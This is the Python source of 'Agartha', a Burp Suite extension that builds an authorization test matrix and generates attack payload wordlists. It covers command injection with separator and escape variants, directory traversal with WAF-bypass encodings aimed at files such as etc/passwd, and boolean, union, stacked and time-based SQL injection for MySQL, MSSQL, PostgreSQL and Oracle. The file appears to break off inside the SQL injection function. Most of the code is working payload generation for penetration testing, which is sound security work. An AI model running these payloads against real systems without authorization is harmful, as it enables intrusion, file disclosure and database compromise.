"""
Author: Volkan Dindar
"""
try:
    import sys
    import re, urlparse, random
    from burp import (IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory)
    from java.awt import (BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit)
    from javax.swing import (JCheckBox, JMenuItem, JTextPane, JTable, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout)
    from javax.swing.border import EmptyBorder
    from javax.swing.table import (DefaultTableModel, TableCellRenderer)
    from java.util import ArrayList
    from threading import Thread
    from java.awt.datatransfer import StringSelection
except:
    print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"

VERSION = "0.81"

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha {LFI|RCE|Auth|SQLi|Http-Js}")
        print "Version " + VERSION + " is just loaded.\n\nAgartha is a security tool for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Code Injection/Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Access Matrix,\n\t\t* SQL Injection Wordlists,\n\t\t* Http Request to Javascript.\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        self._MainTabs.addTab("Authorization Matrix", None, self._tabAuthSplitpane, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.issueAlert("The extension has been loaded.")
        self.tableMatrixReset(self)
        return

    def authMatrixThread(self, ev):
        self._cbAuthColoringFunc(self)
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = " "
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0,self.tableMatrix.getRowCount()):
            for y in range(1,self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0,self.tableMatrix.getRowCount()):
            for y in range(1,self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
        
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._btnAuthNewUserAdd.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning severities."        
        return

    def makeHttpCall(self, urlAdd, userID):
        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]

            # changing url in the request header
            if str(urlparse.urlparse(urlAdd).path):
                # check if query string exists
                if str(urlparse.urlparse(urlAdd).query):
                    header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(urlAdd).path + "?" + urlparse.urlparse(urlAdd).query))
                else:
                    header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(urlAdd).path))
            else:
                header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + "/")

            # header methods
            if "GET" in header[:3]:
                #request was in GET method and will be in POST
                if self._cbAuthGETPOST.getSelectedIndex() == 1:
                    header = self._callbacks.getHelpers().toggleRequestMethod((header))
            else:
                #request was in POST method and will be in GET
                if self._cbAuthGETPOST.getSelectedIndex() == 0:
                    header = self._callbacks.getHelpers().toggleRequestMethod((header))

            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            
            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + "bytes"
        except:
            self.httpReqRes[userID].append("")
            return str(sys.exc_info()[1])

    def authAdduser(self, ev):
        if self.userCount == 4:
            self._lblAuthNotification.text = "You can add up to 4 users"
            return
        
        for line in self._tbAuthURL.getText().split('\n'):
            if not self.isURLValid(str(line)) or line == self._txtURLDefault:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "Please check url list!"
                self._lblAuthNotification.setForeground (Color.red)
                return
        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault or not self._tbAuthHeader.getText().split('\n')[0].count(' ') == 2:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text in self.userNames:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount == 0:
            #header for unauth user
            unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text)
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text)
        self.userNamesHttpUrls.append([])

        urlList = []
        for x in range(0,self.tableMatrix.getRowCount()):
                urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        
        for line in set(self._tbAuthURL.getText().split('\n')):
            if line and not any(re.findall(r'(log|sign).*(off|out)', line, re.IGNORECASE)):
                line = line.replace(' ','')
                self.userNamesHttpUrls[self.userCount].append(line)
                if line not in urlList:
                    self.tableMatrix_DM.addRow([line])
        
        self._tbAuthURL.setText("")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._lblAuthNotification.text = self._tbAuthNewUser.text + " added successfully!"
        self._lblAuthNotification.setForeground (Color.black)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)

        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _cbUnionBasedFunc(self, ev):
        if self._cbUnionBased.isSelected(): 
            self._cbUnionDepth.setEnabled(True)
        else:
            self._cbUnionDepth.setEnabled(False)
        return

    def _cbOrderBasedFunc(self, ev):
        if self._cbOrderBased.isSelected(): 
            self._cbOrderDepth.setEnabled(True)
        else:
            self._cbOrderDepth.setEnabled(False)
        return

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        if self._rbDictSQLi.isSelected():            
            self._txtTargetPath.setText(self._txtDefaultSQLi)
        elif not self.isValid():
            self._lblStatusLabel.setText("input is not valid. ")
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File "+ self._lblStatusLabel.text + self._txtDefaultLFI)
                self._txtTargetPath.setText(random.choice(["etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts"]))
            elif self._rbDictCommandInj.isSelected():
                self._lblStatusLabel.setText("Remote code " +self._lblStatusLabel.text + self._txtDefaultCommandInj)
                self._txtTargetPath.setText(random.choice(["sleep 120", "timeout 120"]))
            return 

        self._lblStatusLabel.setForeground (Color.black)
        self._txtTargetPath.text = self._txtTargetPath.text.strip()
        self._tabDictResultDisplay.setText("")
        self._lblStatusLabel.setText("")
        if self._rbDictCommandInj.isSelected():
            self.funcCommandInj(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        if self._rbDictSQLi.isSelected():
            self.funcSQLi(self)            
        return
       
    def isValid(self):
        # check if any special chars
        regex = re.compile('[@,\'\"!#$%^&*<>\|}{]')
        if(regex.search(self._txtTargetPath.text) == None) and self._txtTargetPath.text.strip():
            #clear
            return True
        else:
            #special char
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        self._lblStatusLabel.setText("")
        self._tabDictPanel_LFI.setVisible(False)
        self._cbDictCommandInjOpt.setVisible(False)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLi.setVisible(False)
        self._tabDictPanel_SQLOptions.setVisible(False)
        if self._rbDictLFI.isSelected():
            self._txtTargetPath.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._tabDictPanel_LFI.setVisible(True)
            self._lblStatusLabel.setText("Please provide a path to generate payloads!")
        elif self._rbDictCommandInj.isSelected():
            self._txtTargetPath.setText(self._txtDefaultCommandInj)
            self._tabDictResultDisplay.setText(self._txtCheatSheetCommandInj)
            self._cbDictCommandInjOpt.setVisible(True)
            self._lblStatusLabel.setText("Please provide a command to generate payloads!")
        elif self._rbDictSQLi.isSelected():
            self._txtTargetPath.setText(self._txtDefaultSQLi)
            self._tabDictPanel_SQLType.setVisible(True)
            self._tabDictPanel_SQLi.setVisible(True)
            self._tabDictPanel_SQLOptions.setVisible(True)
            self.funcSQLi(self)
        return

    def funcCommandInj(self, ev):
        listCommandInj = []        
        prefixes = ["", "\\n", "\\r\\n", "%0a", "%0d%0a"]
        escapeChars = ["",  "'", "\\'", "\"", "\\\""]
        separators = ["&", "&&", "|", "||", ";"]
        suffixes = [" #", " ::", " %00"]
        
        for prefix in prefixes:
            for escapeChar in escapeChars:
                for separator in separators:
                    for suffix in suffixes:
                        listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                        if escapeChar:
                            listCommandInj.append(prefix + separator + self._txtTargetPath.text + escapeChar + suffix + "\n")
                            listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + suffix + "\n")
                            listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                            if suffix != " ::":                            
                                listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + suffix + "\n")
                                listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + escapeChar + suffix + "\n")
                        listCommandInj.append(prefix + self._txtTargetPath.text + "\n")                    
                    listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
            listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
            listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")

        listCommandInj = list(set(listCommandInj))
        listCommandInj.sort(reverse=True)
        if self._cbDictCommandInjEncoding.isSelected():
            listCommandInj = self.encodeURL(listCommandInj)
        self._tabDictResultDisplay.setText(''.join(map(str, listCommandInj)))
        self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtTargetPath.text + '", with '+ str(len(listCommandInj)) + ' result.')
        return

    def funcLFI(self, ev):
        listLFI = []
        dept = int(self._cbDictDepth.getSelectedItem())
        
        if self._txtTargetPath.text.startswith('/') or self._txtTargetPath.text.startswith('\\'):
            self._txtTargetPath.text = self._txtTargetPath.text[1:]
        
        filePath = self._txtTargetPath.text.replace("\\","/")
        
        counter = 0
        if self._cbDictEquality.isSelected():
            counter = dept

        while counter <= dept:
            _upperDirectory = ""
            i = 1
            while i <= counter:
                _upperDirectory += "../"
                i = i + 1
                listLFI.append(_upperDirectory + filePath + "\n")

            if self._cbDictWafBypass.isSelected():
                listLFI.append((_upperDirectory + filePath).replace("..", "...") + "\n")
                listLFI.append((_upperDirectory + filePath).replace("..", "....") + "\n")
                listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + "\n")
                listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + "\n")

                prefixes = ["/", "\\", "/..;/", "..;/"]
                for prefix in prefixes:
                    listLFI.append(prefix + _upperDirectory + filePath + "\n")

                suffixes = ["%00index.html", "%20index.html", "%09index.html", "%0Dindex.html", "%FFindex.html", "%00", "%20", "%09", "%0D", "%FF", ";index.html", "%00.jpg", "%00.jpg", "%20.jpg", "%09.jpg", "%0D.jpg", "%FF.jpg"]
                for suffix in suffixes:
                    listLFI.append(_upperDirectory + filePath + suffix + "\n")

                if "\\" in self._txtTargetPath.text:
                    listLFI.append(_upperDirectory.replace("/", "\\") + self._txtTargetPath.text + "\n")
                    listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "...") + self._txtTargetPath.text + "\n")
                    listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "....") + self._txtTargetPath.text + "\n")
                    listLFI.append(_upperDirectory.replace("/", "\\\\") + self._txtTargetPath.text + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + "\n")
                    listLFI.append(_upperDirectory + self._txtTargetPath.text.replace("/", "\\\\") + "\n")
                    for suffix in suffixes:
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\") + suffix + "\n")

                _slashes = ["..././", "...\\.\\"]
                for _slash in _slashes:
                    listLFI.append(_upperDirectory.replace("../", _slash) + filePath + "\n")

                _slashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
                for _slash in _slashes:
                    listLFI.append(_upperDirectory.replace("/", _slash) + filePath + "\n")
                    listLFI.append(_upperDirectory.replace("/", _slash) + self._txtTargetPath.text + "\n")                    
                    if "\\" in self._txtTargetPath.text:
                        listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "\\" + self._txtTargetPath.text + "\n")
                    else:
                        listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "/" + filePath + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", _slash) + "\n")

                _slashes = ["%2f", "%5c"   , "%252f"     , "%c0%af"      , "%u2215"      , "%u2216"      , "%u2215"      , "%u2216"      , "%c0%af"      , "%c0%5c"      , "%e0%80%af"         , "%c0%80%5c"         , "%c0%2f"    , "%252f"     , "%255c"     , "%25c0%25af"          , "%c1%9c"      , "%25c1%259c"          , "%%32%66"       , "%%35%63"       , "%uEFC8", "%uF025", "0x2f"    , "0x5c"    , "%c0%2f"      , "%c0%5c"]
                _dots = ["%2e%2e", "%2e%2e", "%252e%252e", "%c0%ae%c0%ae", "%uff0e%uff0e", "%uff0e%uff0e", "%u002e%u002e", "%u002e%u002e", "%c0%2e%c0%2e", "%c0%2e%c0%2e", "%e0%40%ae%e0%40%ae", "%e0%40%ae%e0%40%ae", "%c0ae%c0ae", "%252e%252e", "%252e%252e", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", ".."    , ".."    , "0x2e0x2e", "0x2e0x2e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
                for i in range(len(_slashes)):
                    listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + "\n")
                    listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + "\n")
                    listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + "\n")
                    listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + "\n")                    
                    listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + "\n")

            counter = counter + 1

        listLFI = list(set(listLFI))
        listLFI.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
        self._lblStatusLabel.setText('File dictionary: "' + self._txtTargetPath.text + '", with '+ str(len(listLFI)) + ' result. Please make sure payload encoding is disabled, unless you are sure what you are doing.') 
        return

    def funcSQLi(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        if self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected():
            if not self._cbMysqlBased.isSelected() and not self._cbMssqlBased.isSelected() and not self._cbPostgreBased.isSelected() and not self._cbOracleBased.isSelected():
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('There is no a generic method exists for this choice! Please also pick a database!')
                self._tabDictResultDisplay.setText('')
                return
        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected() or self._cbOrderBased.isSelected()):
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('There is no a generic method exists for this choice! Please also pick an attack type!')
                self._tabDictResultDisplay.setText('')
                return

        listSQLi = []
        prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
        
        escapeChars = ["", "'", "\\'"]

        n1 = str(random.randint(10,70))
        n2 = str(random.randint(71,99))
        boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
        
        #suffixes = ["", " -- "]
        suffixes = ["", "; -- "]
        
        if not self._cbSqlWafBypass.isSelected():
            prefixes = [""]
            escapeChars = ["", "'"]

        if self._cbBooleanBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    for boolExpression in boolExpressions:
                        for suffix in suffixes[1:]:
                            listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + " or " + boolExpression + "\n")
            for prefix in prefixes:
                for escapeChar in escapeChars[1:]:
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
        

        if self._cbOrderBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    for suffix in suffixes[1:]:
                        for i in range(int(self._cbOrderDepth.getSelectedItem())):
                            listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + "\n")

        unions = ["null", "1337", "'1337'"]
        if self._cbUnionBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    for suffix in suffixes[1:]:
                        for union in unions:
                            unionPhrase = " union select "
                            for i in range(int(self._cbUnionDepth.getSelectedItem())):
                                unionPhrase += union
                                if self._cbMysqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select sleep(120)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select sleep(120)") + "\n")
                                if self._cbPostgreBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(120))") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as text)") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as integer)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(120))") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as text)") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as integer)") + "\n")
                                if self._cbMssqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:00:02" + escapeChar + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:00:02'" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:00:02\\'" + "\n")
                                if self._cbOracleBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)") + " from dual" + suffix + "\n")                                            
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,120)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as integer)") + " from dual" + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),120)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),120)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,120)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,120)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as integer)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as integer)") + " from dual" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),120)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),120)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as integer)") + " from dual" + "\n")
                                unionPhrase += ","

        for prefix in prefixes:
            for escapeChar in escapeChars:
                for suffix in suffixes[1:]:
                    if self._cbOracleBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select banner from v$version" + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + "\n")
                                listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + "\n")
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,120) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,120)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,120)" + "\n")
                            else:
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual" + "\n")
